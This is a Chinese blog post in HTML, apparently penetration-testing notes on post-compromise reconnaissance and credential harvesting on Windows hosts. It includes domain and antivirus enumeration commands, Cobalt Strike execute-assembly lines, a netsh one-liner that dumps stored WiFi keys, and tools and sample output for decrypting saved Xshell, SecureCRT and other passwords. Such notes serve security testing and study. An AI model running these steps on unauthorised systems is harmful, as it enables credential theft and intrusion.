@@ -1,0 +1,366 @@
+<html>
+<head>
+    <meta charset="utf-8" />
+<meta name="description" content="" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+
+<title>Windows 主机信息搜集 | 风沙吹奏的博客</title>
+
+<link rel="shortcut icon" href="https://thestary7.github.io/favicon.ico?v=1677485922860">
+
+<link href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" rel="stylesheet">
+<link rel="stylesheet" href="https://thestary7.github.io/styles/main.css">
+<!-- <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.0/dist/css/bootstrap.min.css"> -->
+
+<script src="https://cdn.jsdelivr.net/npm/@highlightjs/cdn-assets/highlight.min.js"></script>
+<script src="https://cdn.bootcdn.net/ajax/libs/highlight.js/9.12.0/languages/dockerfile.min.js"></script>
+<script src="https://cdn.bootcdn.net/ajax/libs/highlight.js/9.12.0/languages//dart.min.js"></script>
+
+<!-- <script src="https://cdn.jsdelivr.net/npm/moment@2.27.0/moment.min.js"></script> -->
+<!-- <script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.slim.min.js"></script> -->
+<!-- <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"></script> -->
+<!-- <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.0/dist/js/bootstrap.min.js"></script> -->
+<!-- DEMO JS -->
+<!--<script src="media/scripts/index.js"></script>-->
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-0DCSY0HL57"></script>
+<script>
+    window.dataLayer = window.dataLayer || [];
+
+    function gtag() {
+        dataLayer.push(arguments);
+    }
+
+    gtag('js', new Date());
+    gtag('config', 'G-0DCSY0HL57');
+</script>
+
+
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.css">
+</head>
+<body>
+<div class="main gt-bg-theme-color-first">
+    <nav class="navbar navbar-expand-lg">
+    <a class="navbar-brand" href="/">
+        <img class="user-avatar" src="/images/avatar.png" alt="头像">
+        <div class="site-name gt-c-content-color-first">
+            风沙吹奏的博客
+        </div>
+    </a>
+    <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent"
+        aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation" id="changeNavbar">
+        <i class="fas fa-bars gt-c-content-color-first" style="font-size: 18px"></i>
+    </button>
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+        <div class="navbar-nav mr-auto" style="text-align: center">
+            
+            <div class="nav-item">
+                
+                <a href="https://thestary7.github.io" class="menu gt-a-link">
+                    主页
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="https://thestary7.github.io/archives" class="menu gt-a-link">
+                    归档
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="https://thestary7.github.io/tags" class="menu gt-a-link">
+                    标签
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="https://thestary7.github.io/post/about" class="menu gt-a-link">
+                    关于
+                </a>
+                
+            </div>
+            
+        </div>
+        <div style="text-align: center">
+            <form id="gridea-search-form" style="position: relative" data-update="1677485922860"
+                action="/search/">
+                <input class="search-input" autocomplete="off" spellcheck="false" name="q" placeholder="搜索文章" />
+                <i class="fas fa-search gt-c-content-color-first" style="position: absolute; top: 9px; left: 10px;"></i>
+            </form>
+        </div>
+    </div>
+</nav>
+<script>
+    /* 移动端导航栏展开/收起切换 */
+    document.getElementById('changeNavbar').onclick = () => {
+        var element = document.getElementById('navbarSupportedContent');
+        if (element.style.display === 'none' || element.style.display === '') {
+            element.style.display = 'block';
+        } else {
+            element.style.display = 'none';
+        }
+    }
+</script>
+
+    <div class="post-container">
+        <div class="post-detail gt-bg-theme-color-second">
+            <article class="gt-post-content">
+                <h2 class="post-title">
+                    Windows 主机信息搜集
+                </h2>
+                <div class="post-info">
+                    <time class="post-time gt-c-content-color-first">
+                        · 2023-02-27 ·
+                    </time>
+                    
+                </div>
+                <div class="post-content">
+                    <h1 id="1-主机信息搜集">1. 主机信息搜集</h1>
+<h2 id="11-ip信息">1.1 IP信息</h2>
+<pre><code class="language-bash">ipconfig /all 网卡信息 
+route print 查看路由表 看能到达的地方
+arp -a 查看arp表 看缓存
+
+如果有域:
+net time /domain ## 通过查看dns、时间服务器来获取域控名称。
+net group &quot;domaincontrollers&quot; /domain ## 查看域的所有域控。
+nltest  /domain_trusts ## 查看域信任情况。
+</code></pre>
+<h2 id="12-端口信息">1.2 端口信息</h2>
+<p><code>netstat -ano</code></p>
+<h2 id="13-进程信息">1.3 进程信息</h2>
+<p>主要是看看开启了哪些进程，管理员进程可能涉及提权，杀软进程可能涉及免杀，还有一些第三方的进程（如向日葵、todesk）可能涉及做权限维持，这种都是根据需要去确定的。</p>
+<pre><code class="language-powershell">tasklist /svc //查看所有进程
+tasklist /v //查看进程启动的用户
+taskkill /f /PID //关闭某个pid的进程
+wmic /namespace:\\root\securitycenter2 path antivirusproduct GET displayName,productState,pathToSignedProductExe //查看本机杀软
+</code></pre>
+<h2 id="14-服务收集">1.4 服务收集</h2>
+<p>主要是可能涉及一些提权，已经从服务中提取敏感信息比如说抓取密码等，可以通过产品和进程去判断。</p>
+<pre><code class="language-powershell">wmic product get name,version
+tasklist /svc
+wmic service list brief //服务信息收集
+</code></pre>
+<h2 id="15-计划任务">1.5 计划任务</h2>
+<p>涉及提权，权限维持等，也可能通过计划任务发现脚本文件中可能存在敏感内容。</p>
+<pre><code class="language-powershell">schtasks /query
+</code></pre>
+<h2 id="16-用户收集">1.6 用户收集</h2>
+<p>主要是对提权或者横向移动做铺垫。</p>
+<pre><code class="language-powershell">net user 查看用户
+net localgroup Administrators 查看管理员组
+whoami 当前用户
+
+如果有域:
+net user /domain ## 查看域用户有哪些
+net group &quot;domain admins&quot; /domain ## 查看域管理员有哪些
+</code></pre>
+<h2 id="17-凭证收集">1.7 凭证收集</h2>
+<h3 id="171-浏览器信息搜集">1.7.1 浏览器信息搜集</h3>
+<p>可支持360、搜狗等：<a href="https://github.com/Aquilao/HackBrowserData">https://github.com/Aquilao/HackBrowserData</a><br>
+支持老IE密码收集的：<a href="https://github.com/twelvesec/passcat">https://github.com/twelvesec/passcat</a>，也支持其他浏览器</p>
+<h3 id="172-第三方工具收集">1.7.2 第三方工具收集</h3>
+<h4 id="xshell全版本密码解密">Xshell全版本密码解密</h4>
+<p><a href="https://github.com/JDArmy/SharpXDecrypt">https://github.com/JDArmy/SharpXDecrypt</a><br>
+cmd窗口命令<br>
+执行之后自动获取session并解密。</p>
+<pre><code class="language-powershell">C:\Users\asus\Desktop\DEV\SharpXDecrypt\bin\Debug&gt; .\SharpXDecrypt.exe
+
+Xshell全版本凭证一键导出工具!(支持最新Xshell 7系列版本!)
+Author: 0pen1
+Github: https://github.com/JDArmy
+[!] WARNING: For learning purposes only,please delete it within 24 hours after downloading!
+
+[*] Start GetUserPath....
+UserPath: E:\NetSarang Computer\xshell6
+UserPath: C:\Users\asus\Documents\NetSarang Computer\7
+[*] Get UserPath Success !
+
+[*] Start GetUserSID....
+Username: asus
+userSID: S-1-5-21-736521517-423******97-1340300005-1001
+[*] GetUserSID Success !
+
+XSHPath: E:\NetSarang Computer\xshell6\Xshell\Sessions\192.168.1.110.xsh
+Host: 192.168.1.110
+UserName: wwwuser
+Password: www*******Aqx
+Version: 6.0
+
+XSHPath: C:\Users\asus\Documents\NetSarang Computer\7\Xshell\Sessions\192.168.1.110.xsh
+Host: 192.168.1.110
+UserName: wwwuser
+Password: ww********Aqx
+Version: 7.1
+
+XSHPath: C:\Users\asus\Documents\NetSarang Computer\7\Xshell\Sessions\Tokyo.xsh
+Host: 198.13.51.134
+UserName: root
+Password: W8*********PN__%
+Version: 7.1
+</code></pre>
+<p>Cobalt Strike窗口</p>
+<pre><code class="language-powershell">execute-assembly /path/to/SharpXDecrypt.exe
+execute-assembly /path/to/SharpXDecrypt.exe  &quot;C:\Users\asus\Documents\NetSarang Computer\7\Xshell\Sessions&quot;
+</code></pre>
+<h4 id="finalshell密码解密">FinalShell密码解密</h4>
+<p><a href="https://github.com/passer-W/FinalShell-Decoder">https://github.com/passer-W/FinalShell-Decoder</a><br>
+FinalShell配置文件根路径，一般在 <code>Finalshell安装目录/conn</code>目录下<br>
+<img src="https://thestary7.github.io/post-images/1677485420379.png" alt="" loading="lazy"><br>
+也可将远程主机文件下载到本地解密，输入合法路径后自动生成所有主机配置信息：<br>
+<img src="https://thestary7.github.io/post-images/1677485442302.png" alt="" loading="lazy"></p>
+<h4 id="foxmail邮件解密">Foxmail邮件解密</h4>
+<p><code>E:\Foxmail\Storage\liudehui\Accounts\Account.rec0</code><br>
+用foxmail password decryption软件解密<br>
+<a href="https://securityxploded.com/foxmail-password-decryptor.php">https://securityxploded.com/foxmail-password-decryptor.php</a></p>
+<h4 id="ftp软件filezilla解密">FTP软件FileZilla解密</h4>
+<p><code>C:\Users\LDH\AppData\Roaming\FileZilla\recentservers.xml</code><br>
+base64解密。</p>
+<h4 id="ssh软件securecrt解密">SSH软件SecureCRT解密</h4>
+<p><a href="https://github.com/HyperSine/how-does-SecureCRT-encrypt-password">https://github.com/HyperSine/how-does-SecureCRT-encrypt-password</a><br>
+通常，它应该存储在名为<code>Hostname</code>的ini文件中。<code>%APPDATA%\VanDyke\Config\Sessions</code>下。<br>
+当你找到这个文件时，你会看到：</p>
+<pre><code class="language-powershell">S:&quot;Username&quot;=root
+S:&quot;Password&quot;=
+S:&quot;Password V2&quot;=02:7b9f594a1f39bb36bbaa0d9688ee38b3d233c67b338e20e2113f2ba4d328b6fc8c804e3c02324b1eaad57a5b96ac1fc5cc1ae0ee2930e6af2e5e644a28ebe3fc
+S:&quot;Login Script V2&quot;=
+...
+...
+</code></pre>
+<p>解密：</p>
+<pre><code class="language-powershell">python3 ./SecureCRTCipher.py dec -v2 7b9f594a1f39bb36bbaa0d9688ee38b3d233c67b338e20e2113f2ba4d328b6fc8c804e3c02324b1eaad57a5b96ac1fc5cc1ae0ee2930e6af2e5e644a28ebe3fc
+DoubleLabyrinth
+</code></pre>
+<p>如果SecureCRT小于7.3.3版本，那他的会话文件则是：</p>
+<pre><code class="language-powershell">...
+...
+S:&quot;Username&quot;=root
+D:&quot;[SSH2] Port&quot;=00000016
+S:&quot;Password&quot;=uc71bd1c86f3b804e42432f53247c50d9287f410c7e59166969acab69daa6eaadbe15c0c54c0e076e945a6d82f9e13df2
+D:&quot;Session Password Saved&quot;=00000001
+...
+...
+</code></pre>
+<p>解密：</p>
+<pre><code class="language-powershell">$ ./SecureCRTCipher.py dec c71bd1c86f3b804e42432f53247c50d9287f410c7e59166969acab69daa6eaadbe15c0c54c0e076e945a6d82f9e13df2
+DoubleLabyrinth
+</code></pre>
+<h4 id="teamviewer密码收集">TeamViewer密码收集</h4>
+<p>利用CVE-2019-18988漏洞，经过大佬的测试，15版本也存在漏洞。但是，目前最新的15.4.4445版本已经不存在此问题了。<br>
+<a href="https://github.com/V1V1/DecryptTeamViewer">https://github.com/V1V1/DecryptTeamViewer</a><br>
+<img src="https://thestary7.github.io/post-images/1677485457148.png" alt="" loading="lazy"></p>
+<h4 id="winscpfoxmailfilezillaxmanagernavicat向日葵chrometortoisesvn解密">WinSCP/Foxmail/Filezilla/Xmanager/Navicat/向日葵/Chrome/TortoiseSVN解密</h4>
+<p><a href="https://github.com/RowTeam/SharpDecryptPwd">https://github.com/RowTeam/SharpDecryptPwd</a><br>
+默认情况下，将工具上传至目标服务器，运行即可。<br>
+<img src="https://thestary7.github.io/post-images/1677485466964.png" alt="" loading="lazy"><br>
+如，解密WinSCP，会自动寻找地址。<br>
+<img src="https://thestary7.github.io/post-images/1677485473718.png" alt="" loading="lazy"><br>
+如果拷贝到了本地进行解密，command：<br>
+<code>SharpDecryptPwd.exe Xmanager /user:user /sid:sid /path:session_path</code></p>
+<h3 id="173-rdp凭据解密">1.7.3 RDP凭据解密</h3>
+<p>下载credentialsfileview，<a href="https://www.nirsoft.net/utils/credentials_file_view.html">https://www.nirsoft.net/utils/credentials_file_view.html</a><br>
+打开后需要输入主机的登录密码才可以解密，其他选项默认不用管，解密后得到结果如下：<br>
+<img src="https://thestary7.github.io/post-images/1677485481327.png" alt="" loading="lazy"></p>
+<h3 id="174-wifi密码收集">1.7.4 WiFi密码收集</h3>
+<p>通过如下命令获取连接过的wifi密码：<br>
+<code>for /f  &quot;skip=9 tokens=1,2 delims=:&quot; %i in ('netsh wlan show profiles')  do  @echo %j | findstr -i -v echo |  netsh wlan show profiles %j key=clear</code></p>
+<h3 id="175-其他收集">1.7.5 其他收集</h3>
+<pre><code class="language-powershell">net share  //查看共享
+net use //查看ipc$
+systeminfo //查看计算机信息（提权可能会用，也能判断域环境已经操作系统版本）
+wmic startup get command,caption 查看自启动
+wmic share get name,path,status 查看共享 
+net start 查看当前机器启动的服务 
+cmdkey /l 查看保存的远程连接凭证
+</code></pre>
+<h3 id="176-微信聊天记录解密文件浏览">1.7.6 微信聊天记录解密/文件浏览</h3>
+<p><a href="https://github.com/AdminTest0/SharpWxDump">https://github.com/AdminTest0/SharpWxDump</a><br>
+微信聊天记录默认地址：(关于聊天记录文件：MSG.db，超出240MB会自动生成MSG1.db，以此类推)<br>
+<code>安装目录\WeChat Files\微信用户名\Msg\Multi\MSG0.db &gt; 聊天记录</code><br>
+<code>安装目录\WeChat Files\微信用户名\Msg\MicroMsg.db &gt; Contact字段 &gt; 好友列表</code><br>
+<code>安装目录\WeChat Files\微信用户名\Msg\MediaMsg.db &gt; 语音 &gt; 格式为silk</code><br>
+微信文件默认地址：<br>
+<code>安装目录\WeChat Files\微信用户名\FileStorage\File\</code></p>
+<h2 id="18-配置文件">1.8 配置文件</h2>
+<p>一个正常的Web应用肯定有对应的数据库账号密码信息，是一个不错的宝藏。<br>
+可以使用如下命令寻找包含密码字段的文件：<br>
+<code>findstr  /s /m &quot;password&quot; *.*</code></p>
+<pre><code class="language-powershell">Tomcat:
+CATALINA_HOME/conf/tomcat-users.xml
+
+Apache:
+/etc/httpd/conf/httpd.conf
+
+Nginx:
+/etc/nginx/nginx.conf
+
+Wdcp:
+/www/wdlinux/wdcp/conf/mrpw.conf
+
+Mysql:
+mysql\data\mysql\user.MYD
+
+Hosts文件:
+C:\WINDOWS\system32\drivers\etc\hosts
+</code></pre>
+
+                </div>
+            </article>
+        </div>
+
+        
+            <div class="next-post">
+                <div class="next gt-c-content-color-first">下一篇</div>
+                <a href="https://thestary7.github.io/post/hello-gridea/" class="post-title gt-a-link">
+                    Hello Gridea
+                </a>
+            </div>
+        
+
+        
+
+        
+
+        
+
+        <div class="site-footer gt-c-content-color-first">
+    <div class="slogan gt-c-content-color-first">如果批评不自由，则赞美无意义</div>
+    <div class="social-container">
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+    </div>
+    <div class="footer-info">
+        Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+    </div>
+    <div>
+        Theme <a href="https://github.com/imhanjie/gridea-theme-pure" target="_blank">Pure</a>, Powered by <a
+                href="https://gridea.dev" target="_blank">Gridea</a> | <a href="https://thestary7.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+</div>
+
+<script>
+  hljs.highlightAll()
+</script>
+
+    </div>
+</div>
+</body>
+</html>
